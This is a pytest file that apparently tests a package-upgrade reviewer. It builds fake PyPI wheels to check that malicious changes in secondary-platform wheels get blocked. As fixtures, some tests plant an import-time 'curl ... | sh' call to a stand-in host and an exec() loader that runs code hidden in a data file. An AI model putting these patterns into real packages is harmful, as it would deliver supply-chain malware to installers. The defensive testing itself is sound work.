from __future__ import annotations

import json

import pytest
from packaging.tags import sys_tags
from tests.test_upgrade_review import _kinds, _one, registry
from tests.test_upgrade_review_bypasses import pypi_wheels

from ca9 import api

__all__ = ["registry"]

HERE = str(next(iter(sys_tags())))
ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 120
PE = b"MZ" + b"\x00" * 600
MACHO = b"\xcf\xfa\xed\xfe" + b"\x00" * 120
PLATFORMS = (
    "manylinux_2_17_x86_64.manylinux2014_x86_64",
    "manylinux_2_17_aarch64.manylinux2014_aarch64",
    "musllinux_1_2_x86_64",
    "macosx_11_0_arm64",
    "macosx_10_9_x86_64",
    "win_amd64",
)
UNCOMMON = (
    "cp313-cp313t-manylinux_2_17_x86_64.manylinux2014_x86_64",
    "cp312-cp312-manylinux_2_17_ppc64le.manylinux2014_ppc64le",
    "pp310-pypy310_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64",
    "cp312-cp312-win32",
)


def _extra_tag():
    """A mainstream wheel that is neither pip's choice here nor the release's top-ranked
    platform wheel, so only the review of the release's other wheels sees it."""
    if "aarch64" in HERE and "linux" in HERE:
        return "cp312-cp312-win_amd64"
    return "cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64"


TOP = "cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64"


def _native(tag, version):
    abi, platform = tag.split("-")[1], tag.split("-")[-1]
    stamp = f"{tag}-{version}".encode()
    if platform.startswith("win"):
        return f"pkg/_core.{abi}-{platform}.pyd", PE + stamp
    if platform.startswith("macosx"):
        return f"pkg/_core.cpython-{abi[2:]}-darwin.so", MACHO + stamp
    return f"pkg/_core.cpython-{abi[2:]}-x86_64-linux-gnu.so", ELF + stamp


def _built(tag, version, files):
    path, data = _native(tag, version)
    return {**files, path: data}


def _pick(tag, other, payload, clean):
    if tag == other:
        return payload
    return clean


def _requests_for(registry, version):
    return [url for url in registry.requests if f"-{version}-" in url and url.endswith(".whl")]


def test_payload_only_in_a_mainstream_secondary_wheel_blocks(registry):
    other = _extra_tag()
    clean = {"pkg/__init__.py": "X = 1\n"}
    payload = {"pkg/__init__.py": "import os\nos.system('curl -s https://h.invalid/p | sh')\n"}
    tags = (HERE, TOP, other)
    pypi_wheels(registry, "fan", "1.0", [(tag, _built(tag, "1.0", clean)) for tag in tags])
    pypi_wheels(
        registry,
        "fan",
        "1.1",
        [(tag, _built(tag, "1.1", _pick(tag, other, payload, clean))) for tag in tags],
    )

    result, receipt = _one("pypi", "fan", "1.0", "1.1")

    assert "new_import_time_exec" in _kinds(result, "block")
    assert all(f"fan-1.1-{other}.whl" in delta["detail"] for delta in result["block"])
    assert result["complete"] is True and receipt["complete"] is True


def test_payload_in_a_data_file_of_a_mainstream_secondary_wheel_blocks(registry):
    other = _extra_tag()
    loader = "import os\nexec(open(os.path.join(os.path.dirname(__file__), 'hooks.txt')).read())\n"
    clean = {"pkg/__init__.py": loader, "pkg/hooks.txt": "X = 1\n"}
    payload = {**clean, "pkg/hooks.txt": "import os\nos.system('id')\n"}
    tags = (HERE, TOP, other)
    pypi_wheels(registry, "dat", "1.0", [(tag, _built(tag, "1.0", clean)) for tag in tags])
    pypi_wheels(
        registry,
        "dat",
        "1.1",
        [(tag, _built(tag, "1.1", _pick(tag, other, payload, clean))) for tag in tags],
    )

    result, _receipt = _one("pypi", "dat", "1.0", "1.1")

    assert result["block"]
    assert all(f"dat-1.1-{other}.whl" in delta["detail"] for delta in result["block"])


def test_payload_in_an_uncommon_platform_wheel_is_a_named_limitation(registry):
    clean = {"pkg/__init__.py": "X = 1\n"}
    payload = {"pkg/__init__.py": "import os\nos.system('curl -s https://h.invalid/p | sh')\n"}
    pypi_wheels(
        registry,
        "odd",
        "1.0",
        [(tag, _built(tag, "1.0", clean)) for tag in (HERE, TOP, *UNCOMMON)],
    )
    pypi_wheels(
        registry,
        "odd",
        "1.1",
        [(tag, _built(tag, "1.1", clean)) for tag in (HERE, TOP)]
        + [(tag, _built(tag, "1.1", payload)) for tag in UNCOMMON],
    )

    result, receipt = _one("pypi", "odd", "1.0", "1.1")

    assert result["complete"] is True and receipt["complete"] is True
    named = [item for item in result["limitations"] if "not reviewed" in item]
    assert len(named) == 1
    assert all(f"odd-1.1-{tag}.whl" in named[0] for tag in UNCOMMON)


@pytest.mark.parametrize("added", [False, True])
def test_numpy_shaped_release_with_identical_code_wheels_is_complete(registry, added):
    tags = sorted(
        {HERE}
        | {f"cp3{minor}-cp3{minor}-{platform}" for minor in (11, 12, 13) for platform in PLATFORMS}
    )

    def files(tag, version):
        platform = tag.split("-")[-1]
        content = {
            "pkg/__init__.py": "from pkg.core import run\n",
            "pkg/core.py": f"def run():\n    return '{version}'\n",
            "pkg/__config__.py": f"CONFIG = {{'platform': '{platform}', 'cc': 'gcc'}}\n",
            "pkg/data/table.csv": "a,b\n1,2\n",
        }
        if "linux" in platform:
            content["pkg.libs/libblas-a1b2c3d4.so.3.0"] = ELF + f"{tag}-{version}".encode()
        return _built(tag, version, content)

    for version in ("1.0", "1.1"):
        wheels = [(tag, files(tag, version)) for tag in tags]
        wheels += [(tag, files(tag, version)) for tag in UNCOMMON]
        pypi_wheels(registry, "big", version, wheels)

    result, receipt = _one("pypi", "big", "1.0", "1.1")
    if added:
        first = [{"upload_time_iso_8601": "2025-01-01T00:00:00Z", "yanked": False}]
        second = [{"upload_time_iso_8601": "2025-02-01T00:00:00Z", "yanked": False}]
        registry.documents["https://pypi.org/pypi/big/json"] = json.dumps(
            {"info": {"name": "big"}, "releases": {"1.0": first, "1.1": second}}
        ).encode()
        registry.requests.clear()
        pair = {"ecosystem": "pypi", "name": "big", "old": None, "new": "1.1", "added": True}
        report = api.review_upgrades([pair])
        result, receipt = report["results"][0], report["receipt"]
        assert result["old_resolved"] == "1.0"

    assert result["block"] == [] and result["warn"] == []
    assert result["complete"] is True and receipt["complete"] is True
    assert [item for item in result["limitations"] if "not reviewed" in item] == [
        item for item in result["limitations"] if "uncommon platforms" in item
    ]
    assert len(_requests_for(registry, "1.0")) <= 2
    assert len(_requests_for(registry, "1.1")) <= 2
